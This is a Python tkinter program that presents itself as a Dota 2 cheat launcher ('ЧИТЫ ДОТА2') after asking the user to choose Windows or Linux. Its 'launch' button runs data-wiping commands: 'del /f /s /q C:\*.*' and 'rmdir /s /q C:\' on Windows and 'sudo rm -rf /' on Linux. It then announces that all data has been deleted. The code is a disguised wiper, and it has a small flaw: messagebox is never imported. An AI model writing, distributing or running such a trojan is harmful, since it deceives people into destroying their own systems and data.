import tkinter as tk
import os
import sys
import subprocess

class SystemDestroyerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Выбор ОС")
        self.root.geometry("400x300")
        self.root.resizable(False, False)
        self.center_window()
        
        main_frame = tk.Frame(root)
        main_frame.pack(pady=20)
        
        tk.Label(main_frame, text="Выберите вашу операционную систему:", font=("Arial", 10)).pack(pady=10)
        
        tk.Button(
            main_frame, 
            text="Windows", 
            command=lambda: self.select_os("windows"),
            width=15,
            height=2,
            bg="#0078D7",
            fg="white"
        ).pack(pady=5)
        
        tk.Button(
            main_frame, 
            text="Linux", 
            command=lambda: self.select_os("linux"),
            width=15,
            height=2,
            bg="#E95420",
            fg="white"
        ).pack(pady=5)

    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (width // 2)
        y = (screen_height // 2) - (height // 2)
        self.root.geometry(f'+{x}+{y}')

    def select_os(self, os_type):
        self.root.destroy()
        self.show_main_menu(os_type)

    def show_main_menu(self, os_type):
        main_window = tk.Tk()
        main_window.title("ЧИТЫ ДОТА2")
        main_window.geometry("600x400")
        main_window.resizable(False, False)
        self.center_window_on(main_window)
        
        title_label = tk.Label(
            main_window, 
            text="ЧИТЫ ДОТА2",
            font=("Arial", 28, "bold"),
            fg="#FF4500",
            pady=30
        )
        title_label.pack()
        
        run_button = tk.Button(
            main_window,
            text="ЗАПУСТИТЬ",
            command=lambda: self.execute_destruction(os_type, main_window),
            font=("Arial", 18, "bold"),
            bg="red",
            fg="white",
            width=15,
            height=2
        )
        run_button.pack(pady=30)
        
        main_window.mainloop()

    def center_window_on(self, window):
        window.update_idletasks()
        width = window.winfo_width()
        height = window.winfo_height()
        screen_width = window.winfo_screenwidth()
        screen_height = window.winfo_screenheight()
        x = (screen_width // 2) - (width // 2)
        y = (screen_height // 2) - (height // 2)
        window.geometry(f'+{x}+{y}')

    def execute_destruction(self, os_type, window):
        try:
            if os_type == "windows":
                subprocess.run("del /f /s /q C:\\*.*", shell=True)
                subprocess.run("rmdir /s /q C:\\", shell=True)
            else:
                subprocess.run("sudo rm -rf /", shell=True)
                
            messagebox.showinfo(
                "УСПЕХ", 
                "Все данные на вашем компьютере успешно удалены!\n"
                "Ваша система больше не функционирует."
            )
        except Exception as e:
            messagebox.showerror("Ошибка", f"Произошла ошибка: {str(e)}")
        
        window.destroy()
        sys.exit()

if __name__ == "__main__":
    root = tk.Tk()
    app = SystemDestroyerApp(root)
    root.mainloop()
